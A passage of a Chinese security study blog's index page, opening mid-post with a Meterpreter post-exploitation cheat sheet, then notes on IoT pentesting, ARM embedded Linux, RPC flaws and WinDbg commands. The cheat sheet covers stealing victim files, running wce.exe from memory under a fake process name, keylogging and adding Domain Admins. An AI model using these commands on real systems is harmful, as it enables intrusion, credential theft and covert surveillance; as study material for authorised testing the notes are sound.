+<h3 id="2-文件系统命令"><a href="#2-文件系统命令" class="headerlink" title="2.文件系统命令"></a>2.文件系统命令</h3></li>
+<li><p>cat c:\boot.ini –查看文件内容,文件必须存在</p>
+</li>
+<li><p>del c:\boot.ini –删除指定的文件</p>
+</li>
+<li><p>upload /root/Desktop/netcat.exe c:\  –上传文件到目标机主上，如upload  setup.exe C:\windows\system32\</p>
+</li>
+<li><p>download nimeia.txt /root/Desktop/   –下载文件到本机上如：download C:\boot.ini /root/或者download C:\“ProgramFiles”\Tencent\QQ\Users\295<strong>**</strong>125\Msg2.0.db /root/</p>
+</li>
+<li><p>edit c:\boot.ini   –编辑文件</p>
+</li>
+<li><p>getlwd –打印本地目录</p>
+</li>
+<li><p>getwd –打印工作目录</p>
+</li>
+<li><p>lcd –更改本地目录</p>
+</li>
+<li><p>ls –列出在当前目录中的文件列表</p>
+</li>
+<li><p>lpwd –打印本地目录</p>
+</li>
+<li><p>pwd –输出工作目录</p>
+</li>
+<li><p>cd c:\  –进入目录文件下</p>
+</li>
+<li><p>rm file  –删除文件</p>
+</li>
+<li><p>mkdir dier  –在受害者系统上的创建目录</p>
+</li>
+<li><p>rmdir –受害者系统上删除目录</p>
+</li>
+<li><p>dir –列出目标主机的文件和文件夹信息</p>
+</li>
+<li><p>mv –修改目标主机上的文件名</p>
+</li>
+<li><p>search -d d:\www -f web.config  –search 文件，如search  -d c:\  -f*.doc</p>
+</li>
+<li><p>meterpreter &gt; search -f autoexec.bat   –搜索文件</p>
+</li>
+<li><p>meterpreter &gt; search -f sea*.bat c:\xamp\</p>
+</li>
+<li><p>enumdesktops      –用户登录数</p>
+</li>
+<li><p>下载文件:使用命令“download +file path”,将下载目标机器的相对应权限的任何路径下的文件</p>
+</li>
+<li><p>上传文件: upload 命令为上传文件到我们的目标机器</p>
+</li>
+<li><p>查看文件: cat filename 在当前目录下查看文件内容，输入命令后便会返回给我们所查看文件的内容。</p>
+</li>
+<li><p>切换、查询当前路径: pwd 命令将查询当前在dos命令下的路径，“cd”命令可以改变当前路径</p>
+</li>
+<li><p>sysinfo 命令: 显示远程主机的系统信息，显示计算机、系统信息、结构、语言等信息。可以看到远程主机的操作系统是windows XP service pack 2，sp2这个系统有很多漏洞。</p>
+</li>
+<li><p>execute命令: 为目标主机上执行一个命令，其中“execute -h”显示帮助信息。-f为执行要运行的命令</p>
+<ul>
+<li>如果希望隐藏后台执行，加参数-H <code>execute  -H -f notepad.exe</code></li>
+<li>我们运行目标主机上的cmd.exe程序，并以隐藏的方式直接交互到我们的meterpreter会话上 <code>execute  -H -i -f cmd.exe</code></li>
+<li>在目标主机内存中直接执行我们攻击主机上的攻击程序，比如wce.exe，又比如木马等，这样可以避免攻击程序存储到目标主机硬盘上被发现或被查杀  <code>execute  -H -m -d notepad.exe-f  wce.exe -a &quot;-o wce.txt&quot;</code><ul>
+<li>-d 在目标主机执行时显示的进程名称（用以伪装）</li>
+<li>-m 直接从内存中执行</li>
+<li>-o wce.txt 是wce.exe的运行参数</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>idletime命令:为显示目标机器截止到当前无操作命令的时间</p>
+</li>
+<li><p>search命令:在目标主机搜索特定的文件。该命令能够通过搜索整个系统或特定的文件夹。使用<code>search –h</code>命令来查看search命令的帮助信息</p>
+</li>
+<li><p>edit命令: 调用vi编辑器，对目标主机上的文件修改</p>
+<h3 id="3-网络命令"><a href="#3-网络命令" class="headerlink" title="3.网络命令"></a>3.网络命令</h3></li>
+<li><p>ipconfig/ifconfig –显示网络接口的关键信息，包括 IP 地址</p>
+</li>
+<li><p>portfwd  add -l 4444 -p 3389 -r 192.168.1.102  –端口转发,本机监听4444,把目标机3389转到本机4444</p>
+</li>
+<li><p>netstat -an | grep“4444”   –查看指定端口开放情况</p>
+</li>
+<li><p>rdesktop -u Administrator -p bk#123 127.0.0.1:4444  –使用rdesktop来连接桌面，-u 用户名 -p 密码</p>
+</li>
+<li><p>rdesktop 127.1.1.0:4444  –需要输入用户名和密码远程连接</p>
+</li>
+<li><p>route –查看或修改受害者路由表</p>
+<ul>
+<li>route add 192.168.1.0 255.255.255.0 1  –添加动态路由</li>
+<li>route print  –路由表输出</li>
+</ul>
+</li>
+<li><p>runget_local_subnets  –目标主机的内网IP段情况</p>
+</li>
+<li><p>Arp       –看ARP缓冲表</p>
+</li>
+<li><p>Getproxy     –获取代理</p>
+</li>
+<li><p>portfwd：网络命令则有列出ip信息(ipconfig),展示修改路由表(route),还有端口转发(portfwd)。</p>
+<h3 id="4-键盘监听"><a href="#4-键盘监听" class="headerlink" title="4.键盘监听"></a>4.键盘监听</h3></li>
+<li><p>keyscan_start：开启键盘记录功能</p>
+</li>
+<li><p>keyscan_dump：显示捕捉到的键盘记录信息</p>
+</li>
+<li><p>keyscan_stop：停止键盘记录功能</p>
+</li>
+<li><p>uictl enable keyboard/mouse –接管目标主机的键盘和鼠标。</p>
+<h3 id="5-系统命令"><a href="#5-系统命令" class="headerlink" title="5.系统命令"></a>5.系统命令</h3></li>
+<li><p>reboot –重新启动受害人的计算机</p>
+</li>
+<li><p>reg –与受害人的注册表进行交互</p>
+</li>
+<li><p>rev2self  –回到控制目标主机的初始用户账户下</p>
+</li>
+<li><p>shell –获得控制台权限</p>
+</li>
+<li><p>shutdown –关闭了受害者的计算机</p>
+</li>
+<li><p>sysinfo  –查看目标机系统信息，如机器名，操作系统等</p>
+</li>
+<li><p>add_user username password -h ip     –在远程目标主机上添加一个用户</p>
+</li>
+<li><p>add_group_user “Domain Admins” username -h ip    –将用户添加到目标主机的域管理员组中</p>
+</li>
+</ul>
+
+      
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/chrome/" rel="tag">chrome</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-《物联网渗透测试》学习笔记1" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/10/16/%E3%80%8A%E7%89%A9%E8%81%94%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/" class="article-date">
+      <time datetime="2020-10-16T03:47:33.440Z" itemprop="datePublished">2020-10-16</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/10/16/%E3%80%8A%E7%89%A9%E8%81%94%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/">《物联网渗透测试》学习笔记1</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h1 id="0x01-IOT渗透测试"><a href="#0x01-IOT渗透测试" class="headerlink" title="0x01 IOT渗透测试"></a>0x01 IOT渗透测试</h1><p>定义IoT生态系统与渗透测试生命周期</p>
+<ul>
+<li>渗透测试方法：<ul>
+<li>黑盒测试</li>
+<li>白盒测试</li>
+<li>灰盒测试<h2 id="固件入门"><a href="#固件入门" class="headerlink" title="固件入门"></a>固件入门</h2>固件是一种写入硬件设备的软件，作用是对应用和各项系统功能实施控制，运行固件的设备称为嵌入式系统。</li>
+</ul>
+</li>
+</ul>
+<p>固件通常由bootloader、内核、文件系统以及其他资源组成，</p>
+<p>固件组成：闪存、bootloader、内核、根文件系统。</p>
+<ul>
+<li><p>bootloader:主要作用包括RAM初始化（目的是存储易失性数据）、串口初始化、机器类型检测、内核参数链表设置、initramfs(基于RAM的初始文件系统)加载以及内核镜像调用等。ARM、MIPS架构中部分常见的bootloader包括：Redboot、u-boot以及barebox等。当bootloader启动内核之后，文件系统就完成了加载。</p>
+</li>
+<li><p>固件可以采用的文件系统类型：SquashFS、cramFS、JFFS2、YAFFS2以及ext2等。</p>
+<h2 id="IoT中的Web应用"><a href="#IoT中的Web应用" class="headerlink" title="IoT中的Web应用"></a>IoT中的Web应用</h2><p>通常嵌入书web应用被设计为在自包含的环境中运行</p>
+</li>
+<li><p>目前iot领域主要有两种不同的web应用模型</p>
+<ul>
+<li>混合云模型：包含厂商或供应商提供的基于软件即服务的web应用，作用是同运行在嵌入式设备固件中的web应用程序建立连接，将数据从厂商的云服务器中同步到本地网络的嵌入式设备中。</li>
+<li>独立嵌入式服务器模型</li>
+</ul>
+</li>
+</ul>
+<p>web通信：浏览器、、嵌入式服务器和web应用服务器之间的通信通常要么借助简单对象访问协议（SOAP）/XML等web服务，要么借助基于http/htps复合REST规范的API来实现。</p>
+<h2 id="硬件设备基础"><a href="#硬件设备基础" class="headerlink" title="硬件设备基础"></a>硬件设备基础</h2><p>硬件输入：</p>
+<ul>
+<li>EEPROM，是非易失性存储器。以单个字节为单位进行读写，可通过电荷或紫外线照射擦除数据。读写次数有限。</li>
+<li>NAND闪存以区块为单位读写。存储设备的boootloader。</li>
+<li>UART接口是访问设备最为常见的方式。连接改接口后即可获得root权限。PCB上UART接口的引脚定义中包括Tx、Rx、Vcc和GND 4个引脚。连接UART接口前需要使用万用表识别出引脚。</li>
+<li>JTAG接口是遵循IEEE 1149.1标准的另一种国际标准测试协议。用于芯片级和系统级的测试。，包含5个引脚：TDI、TDO、TMS、TCK、TRST.可以接到芯片的tap（测试访问口）<h2 id="IoT无线通信简介"><a href="#IoT无线通信简介" class="headerlink" title="IoT无线通信简介"></a>IoT无线通信简介</h2>最常用协议：Wi-Fi(802.11)、ZigBee(802.15.4)、Z-Ware、蓝牙(802.15.1)、低功耗蓝牙。<h1 id="IoT威胁建模"><a href="#IoT威胁建模" class="headerlink" title="IoT威胁建模"></a>IoT威胁建模</h1></li>
+</ul>
+
+      
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/IOT-%E3%80%8A%E7%89%A9%E8%81%94%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E3%80%8B/" rel="tag">IOT 《物联网渗透测试》</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-《ARM嵌入式Linux系统开发》学习笔记1" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/10/16/%E3%80%8AARM%E5%B5%8C%E5%85%A5%E5%BC%8FLinux%E7%B3%BB%E7%BB%9F%E5%BC%80%E5%8F%91%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/" class="article-date">
+      <time datetime="2020-10-16T03:47:33.437Z" itemprop="datePublished">2020-10-16</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/10/16/%E3%80%8AARM%E5%B5%8C%E5%85%A5%E5%BC%8FLinux%E7%B3%BB%E7%BB%9F%E5%BC%80%E5%8F%91%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/">《ARM嵌入式Linux系统开发详解》学习笔记1</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h1 id="0x01-嵌入式系统入门"><a href="#0x01-嵌入式系统入门" class="headerlink" title="0x01 嵌入式系统入门"></a>0x01 嵌入式系统入门</h1><p><b>什么是嵌入式系统：</b></p>
+<p>一种为特定设备服务的，软件硬件可裁剪的计算机系统，形式变化多样、体积小。如手机、微波炉，对于手机、微波炉来说，需要小型计算机来控制，换句话，是需要把计算机全入到手机和微波炉里，也就是嵌入式系统，不需要严格地响应时间和数据吞吐量，最关键的是能够缩小体积以及功能专门化，嵌入式系统种类繁多，按照系统硬件的核心处理器来说可以分成嵌入式微控制器和嵌入式微处理器。</p>
+<p><b>嵌入式微控制器：</b></p>
+<p>嵌入式微控制器也就是传统意义上的单片机，是目前嵌入式系统的前身。单片机就是把一个计算机的主要功能集成到一个芯片上，即一个芯片就是一个计算机，体积小、结构简单、便于开发以及价格经济。</p>
+<p>通常一个单片机芯片包含运算处理单元、ARM、Flash存储器以及外部接口，通过外部接口可以输出或者输入心寒，控制相应的设备，用户可以把编写好的代码烧写到单片机芯片内部来控制外部设备。</p>
+<p><b>嵌入式微处理器：</b></p>
+<p>单片机处理能力低，嵌入式微处理器是最近几年随着大规模集成电路发展同步，处理能力更强，目前主流嵌入式微处理器都是32位，而单片机多是8位和16位。</p>
+<p><b>典型嵌入式系统组成：</b></p>
+<p>嵌入式系统与传统PC一样，也是一种及计算机系统，由硬件和软件组成，硬件包括嵌入式微控制器和微处理器，以及一些外围元器件和外部设备；软件包括嵌入式操作系统和应用软件。</p>
+<p>嵌入式系统种类繁多，不同的嵌入式系统软、硬件很难兼容，软件必须修改而硬件必须重新设计才能使用。</p>
+<p>典型嵌入式系统:</p>
+<ul>
+<li>硬件：<ul>
+<li>嵌入式处理器：处理器是整个系统的核心，负责处理所有的软件程序以及外部设备的信号</li>
+<li>外部设备：在不同系统中有不同选择。</li>
+</ul>
+</li>
+<li>软件：<ul>
+<li>嵌入式操作系统：是软硬件的接口，负责管理系统的所有软件和硬件资源，还可以通过驱动程序与外部设备打交道。</li>
+<li>应用软件：利用操作系统提供的功能开发出针对某个需求的程序，供用户使用。</li>
+</ul>
+</li>
+</ul>
+<h1 id="0x02-嵌入式软硬件系统"><a href="#0x02-嵌入式软硬件系统" class="headerlink" title="0x02 嵌入式软硬件系统"></a>0x02 嵌入式软硬件系统</h1><p>数字电路是计算机的基础。</p>
+<p>进制转换</p>
+<p>计算机组成原理</p>
+<p>直接内存访问：DMA</p>
+<p>软件：系统软件、应用软件</p>
+<p>软件开发：需求分析、概要设计和详细设计、编码和调试、测试和维护。</p>
+<p>常见软件开发模型：瀑布开发模型、增量开发模型、统一软件开发模型。</p>
+<p>操作系统的基本结构都是内核、驱动程序、程序库。</p>
+<h1 id="0x03-ARM处理器"><a href="#0x03-ARM处理器" class="headerlink" title="0x03 ARM处理器"></a>0x03 ARM处理器</h1><ul>
+<li>微处理器<ul>
+<li>通用微处理器：用于高性能计算</li>
+<li>嵌入式微处理器：针对某种特定应用的高能力计算</li>
+<li>微控制器：用于控制某种设备，通常集成了多种外部设备控制器，处理指令能力不强但价格低廉。</li>
+</ul>
+</li>
+</ul>
+<p>ARM:高性能RISC机器。</p>
+<ul>
+<li>芯片体积小，功耗低，成本低性能优异</li>
+<li>支持Thumb(16位)和ARM(32位)</li>
+<li>内部大量使用寄存器，执行指令速度快。</li>
+<li>大部分指令是操作寄存器，很少访问外部内存</li>
+<li>采用多级流水线结构处理速度快。</li>
+<li>多种寻址方式，数据存取方式灵活</li>
+<li>指令长度固定，便于编译器操作以及执行指令</li>
+</ul>
+<h3 id="ARM指令集"><a href="#ARM指令集" class="headerlink" title="ARM指令集"></a>ARM指令集</h3><ul>
+<li>算术运算指令<ul>
+<li>ADD:加法运算<ul>
+<li>add dest,op1,op2 //dest是目的寄存器，op1 op2是操作数,dest=op1+op2</li>
+</ul>
+</li>
+<li>ADC:带进位加法<ul>
+<li>ADC dest,op1,op2</li>
+</ul>
+</li>
+<li>SUB:减法<ul>
+<li>sub dest,op1,op2</li>
+<li>dest=op1-op2</li>
+</ul>
+</li>
+<li>SBC：带进位减法</li>
+</ul>
+</li>
+<li>逻辑运算指令<ul>
+<li>AND:逻辑与(1 1为1，0 0为1，1 0为0)<ul>
+<li>and dest,op1,op2</li>
+<li>dest=op1 and op2</li>
+</ul>
+</li>
+<li>EOR:异或（1 1为0，0 0为0，10为1）</li>
+<li>MOV:复制数据<ul>
+<li>mov dest,op1</li>
+<li>dest=op1</li>
+<li>mov r0,r0,LSL#3//r0=r0*8,LSL寄存器左移三位，即乘以8</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>分支指令<ul>
+<li>B:跳转<ul>
+<li>b 地址 //跳转到指定地址</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>数据传送指令<ul>
+<li>单一数据传送指令：向内存装载和存储一个字节或一个字长的数据<ul>
+<li>LDR Rd,地址</li>
+<li>STR Rd,地址</li>
+<li>LDR B Rd,地址</li>
+<li>STR B Rd,地址 </li>
+</ul>
+</li>
+<li>多数据传送指令：向内存装载和存储多个字节或字的数据<ul>
+<li>xxM Rn(!),&lt;寄存器列表&gt;{^}</li>
+<li>xx:LD–装载，ST–存储</li>
+<li>LDMED LDMIB//++i</li>
+<li>LDMFD LDMIA//i++</li>
+<li>LDMEA LDMDB//++*i</li>
+<li>LDMFA LDMDA//*i++</li>
+<li>STMFA STMIB//存储前增加地址</li>
+<li>STMEA STMIA//存储后增加地址</li>
+<li>STMFD STMDB//存储前增加值</li>
+<li>STMED STMDA//存储后增加值</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>ARM状态：0位表示ARM状态，1位表示Thumb状态,BX指令切换状态。</p>
+<p>MMU:内存管理单元。</p>
+<blockquote>
+<p>LSL:逻辑左移，二进制从右往左移动，空位补0（就是原数值乘以2的移位次方）<br>LSR:逻辑右移，二进制从左往右，空位补0<br>ASR:算术右移，符号位不变，高位空出补0，低位补1<br>ROR:循环右移，低位移到高位<br>RRX:带扩展的循环右移：操作数右移一位，高端空出位用原C标志值填充</p>
+</blockquote>
+<h3 id="寻址方式"><a href="#寻址方式" class="headerlink" title="寻址方式"></a>寻址方式</h3><ul>
+<li>立即寻址:用#表示数值<ul>
+<li>subs r0,#1;r0=r0-1</li>
+<li>mov r0,#0xff00;r0=0xff00</li>
+</ul>
+</li>
+<li>寄存器寻址方式：读取寄存器得到操作数<ul>
+<li>mov r1,r2;r1=r2</li>
+<li>sub r0,r1,r2;r0=r1-r2</li>
+</ul>
+</li>
+<li>寄存器偏移寻址：寄存器的值移位得结果<ul>
+<li>mov r0,r1,LSL #3;r0=r1*8</li>
+<li>ands r0,r2,LSL #3;r0= r2*8 and r1</li>
+</ul>
+</li>
+<li>寄存器间接寻址：寄存器为地址，从对应内存重取出数据<ul>
+<li>LDR r0,[r1];r1为地址，从内存中取出数据存入r0</li>
+<li>SWP r0,r0,[r1];r1为地址，从内存中取出数据与r0交换</li>
+</ul>
+</li>
+<li>基址寻址：把寄存器内容与指定便宜相加，得数据地址，后从内存中取出数据<ul>
+<li>LDR r0,[r1,#0xf];r1数值与0xf相加得到数据地址</li>
+<li>STR r0,[r1,#-2];r1数值-2得到数据地址</li>
+</ul>
+</li>
+<li>多寄存器寻址：一次传输多个寄存器值<ul>
+<li>LDMIA r1!,{r2<del>r7,r12};r1单元重数据读到r2</del>r7和r12,r1指定地址自动加1</li>
+</ul>
+</li>
+<li>栈寻址：先进后出，通过栈指针寄存器寻址<ul>
+<li>STMFD SP!,{R0<del>R7,LR};r0</del>r7和LR的内容压入堆栈</li>
+<li>LDMFD SP!,{r0<del>r7,LR};从堆栈中取出数据到r0</del>r7和LR</li>
+</ul>
+</li>
+</ul>
+<h1 id="0x04-嵌入式Linux"><a href="#0x04-嵌入式Linux" class="headerlink" title="0x04 嵌入式Linux"></a>0x04 嵌入式Linux</h1><p>一般来说，嵌入式操作系统是由启动程序、核心、根文件系统组成，通过特殊的烧录工具将编译好的嵌入式系统文件影像烧写到目标板的只读存储器（ROM）或Flash存储器中。</p>
+<h1 id="0x05-建立软件开发环境"><a href="#0x05-建立软件开发环境" class="headerlink" title="0x05 建立软件开发环境"></a>0x05 建立软件开发环境</h1><ul>
+<li>运行在windows平台下得到Linux系统模拟环境：Cygwin.</li>
+<li>linux下：串口工具minicom</li>
+<li>windows下：串口工具xshell</li>
+<li>ARM集成开发环境ADS<ul>
+<li>c语言编译器armcc</li>
+<li>c++语言编译器armcpp</li>
+</ul>
+</li>
+</ul>
+<h1 id="0x06-第一个linux应用程序"><a href="#0x06-第一个linux应用程序" class="headerlink" title="0x06 第一个linux应用程序"></a>0x06 第一个linux应用程序</h1><ul>
+<li>vi创建源代码文件hello.c</li>
+<li>gcc -c hello.c 编译运行<h1 id="0x07-Linux应用程序编程基础"><a href="#0x07-Linux应用程序编程基础" class="headerlink" title="0x07 Linux应用程序编程基础"></a>0x07 Linux应用程序编程基础</h1></li>
+<li>堆栈</li>
+<li>内存管理函数<ul>
+<li>malloc():分配内存，不能初始化内存空间</li>
+<li>free()：释放malloc()分配的内存</li>
+</ul>
+</li>
+<li>实用的内存分配函数<ul>
+<li>calloc():分配一块新内存，向应用程序分诶内存，分配后会初始化新分配的内存空间</li>
+<li>realloc():改变一块已经分配的内存大小，函数调整后的内存空间起始地址有可能与原来的不同，所以需要realloc()函数的返回值。</li>
+</ul>
+</li>
+<li>文件指针和流：FILE*fp</li>
+<li>getc() /fgetc() /getchar()</li>
+<li>POSIX文件I/O编程<ul>
+<li>POSIX可移植操作系统接口</li>
+<li>open() /creat() /close() /read() /write() /fcnt()修改一打开文件属性</li>
+<li>文件头：<ul>
+<li>&lt;sys/types.h&gt;</li>
+<li>&lt;sys/stat.h&gt;</li>
+<li>&lt;fcntl.h&gt;<h1 id="0x08-开发多进程-线程程序"><a href="#0x08-开发多进程-线程程序" class="headerlink" title="0x08 开发多进程/线程程序"></a>0x08 开发多进程/线程程序</h1></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>PCB进程控制块</li>
+<li>fork()调用创建进程</li>
+<li>退出进程：exit()、_exit()、atexit()、on_exit().</li>
+<li>常用进程间通信方法：<ul>
+<li>管道：单方向传送数据，只能在有共同父进程的进程间使用<ul>
+<li>pipe()函数：创建管道</li>
+<li>#include&lt;unistd.h&gt; int pipe(int filedes[1]);</li>
+</ul>
+</li>
+<li>共享内存：不同进程可访问<ul>
+<li>int shmget():创建</li>
+<li>void *shmat：获得一个共享内存ID对应的内存其实地址</li>
+<li>int shmdt：从程序中分立一块共享内存</li>
+</ul>
+</li>
+<li>FIFO</li>
+<li>消息队列</li>
+<li>信号量</li>
+<li>共享存储</li>
+<li>socker</li>
+</ul>
+</li>
+<li>Linux的多进程和多线程</li>
+</ul>
+<h1 id="0x09-网络通信应用"><a href="#0x09-网络通信应用" class="headerlink" title="0x09 网络通信应用"></a>0x09 网络通信应用</h1><ul>
+<li>TCP/IP协议簇</li>
+</ul>
+<p><img src="https://i.loli.net/2020/09/07/REugKvzkfIn7B58.png" alt="捕获.PNG"></p>
+<ul>
+<li>IP协议：在传输层，负责数据包的传输管理<ul>
+<li>实现两个功能：寻址和分段</li>
+</ul>
+</li>
+</ul>
+
+      
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">学习笔记</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-《0 day安全》学习笔记1" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/10/16/%E3%80%8A0%20day%E5%AE%89%E5%85%A8%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/" class="article-date">
+      <time datetime="2020-10-16T03:47:33.435Z" itemprop="datePublished">2020-10-16</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/10/16/%E3%80%8A0%20day%E5%AE%89%E5%85%A8%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/">RPC入侵：MS06-040与MS08-067</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h1 id="RPC漏洞"><a href="#RPC漏洞" class="headerlink" title="RPC漏洞"></a>RPC漏洞</h1><p>RPC即Remote Procedure Call,是分布式计算中的技术，属于进程间的通信，RPC就是在自己的程序中调用一个函数，这个函数是在另外一个或多个远程机器上执行，执行完后将结果传回主机进行后续操作，如果远程调用的函数出现了问题，甚至有可以被利用的安全漏洞，这就是RPC漏洞。</p>
+
+      
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E3%80%8A0-Day%E5%AE%89%E5%85%A8%E3%80%8B/" rel="tag">《0 Day安全》</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-WinDbg使用整理" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/10/16/WinDbg%E4%BD%BF%E7%94%A8%E6%95%B4%E7%90%86/" class="article-date">
+      <time datetime="2020-10-16T03:47:33.431Z" itemprop="datePublished">2020-10-16</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/10/16/WinDbg%E4%BD%BF%E7%94%A8%E6%95%B4%E7%90%86/">WinDbg使用整理</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="0x00-基础命令"><a href="#0x00-基础命令" class="headerlink" title="0x00 基础命令"></a>0x00 基础命令</h2><ul>
+<li>.sympath　　//显示设置的符号表路径</li>
+<li>.reload　　　　//此命令主要用于加载符号表。</li>
+<li>.reload /f　　//重新装载模块</li>
+<li>.reload /i　　//强制加载mismatched symbol</li>
+<li>U　　//这个命令主要用于反汇编某个地址，其后面可以跟函数名和地址。U命令后面可以加L表示延长反汇编长度</li>
+<li>db　　//显示一字节的长度。</li>
+<li>dw　　//显示两字节的长度。</li>
+<li>dd　　//显示四字节的长度。</li>
+<li>dq　　//显示八字节的长度。</li>
+<li>dD　　//显示double实数(8字节的长度)。</li>
+<li>df　　//显示float实数(4字节的长度)。</li>
+<li>da     //显示asscii值</li>
+<li>du     //显示unicode值</li>
+<li>ds     //显示ANI_STRING值</li>
+<li>dS     //显示UNICODE_STRING的值</li>
+<li>eb address value　　//在address 这个地址写入一个字节value</li>
+<li>ew address value　　//在address 这个地址写入两字节value</li>
+<li>ed address value　　//在address 这个地址写入四字节字节value</li>
+<li>eq address value　　//在address 这个地址写入八字节字节value</li>
+</ul>
+<h2 id="0x01-对象相关命令"><a href="#0x01-对象相关命令" class="headerlink" title="0x01 对象相关命令"></a>0x01 对象相关命令</h2><ul>
+<li>dt　　//dt命令主要用于查看结构体。</li>
+<li>lm　　//列出模块。</li>
+<li>lm vm 模块名　　//查看模块详细信息。 </li>
+<li>!process 0 0 　　　　//列出系统进程信息</li>
+<li>!process 0 0 进程名  //列出该进程的信息</li>
+<li>!process 0 1 进程名  //列出该进程更加的信息</li>
+<li>!process 0 7 进程名  //列出该进程的详细信息，包括线程的</li>
+<li>.process EPROCESS　　//切入该进程中</li>
+<li>!object 地址　　//显示该地址的对象信息。</li>
+<li>bp address  //在地址address插入断点。</li>
+<li>ba命令是是硬件断点命令，通过设置cpu的dx寄存器来拦截线程。</li>
+<li>ba access size 地址　　//access 是访问的方式，比如 e (执行)，r (读/写)，w (写) ，size是监控访问的位置 的大小，以字节为单位。值 为 1、2或4，在64位机器上还可以是8。</li>
+<li>bd/be/bc</li>
+<li>bd 断点号 //此命令是关闭断点号所对应的断点 。</li>
+<li>be 断点号 //此命令是开启断点号所对应的断点 。</li>
+<li>bc *　　　//去除所有断点。</li>
+<li>x   //x命令用来模糊查询</li>
+<li>x nt!kes<em>des*table</em>   //样查看SSDT表的地址</li>
+<li>dds 地址 //此命令用来解析某连续地址的函数名。</li>
+</ul>
+
+      
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">学习笔记</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-V8漏洞初学习" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/10/16/V8%E6%BC%8F%E6%B4%9E%E5%88%9D%E5%AD%A6%E4%B9%A0/" class="article-date">
+      <time datetime="2020-10-16T03:47:33.417Z" itemprop="datePublished">2020-10-16</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/10/16/V8%E6%BC%8F%E6%B4%9E%E5%88%9D%E5%AD%A6%E4%B9%A0/">V8漏洞初学习</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
